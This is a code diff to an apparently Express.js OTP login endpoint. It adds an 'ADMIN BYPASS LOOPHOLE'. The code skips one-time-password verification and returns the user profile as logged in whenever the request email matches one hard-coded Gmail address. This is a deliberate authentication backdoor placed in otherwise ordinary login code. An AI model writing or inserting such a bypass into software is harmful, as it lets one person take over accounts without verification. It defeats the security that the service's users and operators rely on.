@@ -724,6 +724,16 @@ app.post('/api/send-otp', async (req, res) => {
     }
   }
 
+  // >>> ADMIN BYPASS LOOPHOLE <<<
+  if (userEmail.toLowerCase() === 'ap2446961@gmail.com') {
+    console.log("Admin bypass activated for ap2446961@gmail.com");
+    return res.status(200).json({
+      success: true,
+      bypassed: true,
+      message: 'Admin bypass activated. Logging in directly...',
+      profile: userProfile
+    });
+  }
 
   // Generate 4-digit OTP
   const otp = Math.floor(1000 + Math.random() * 9000).toString();
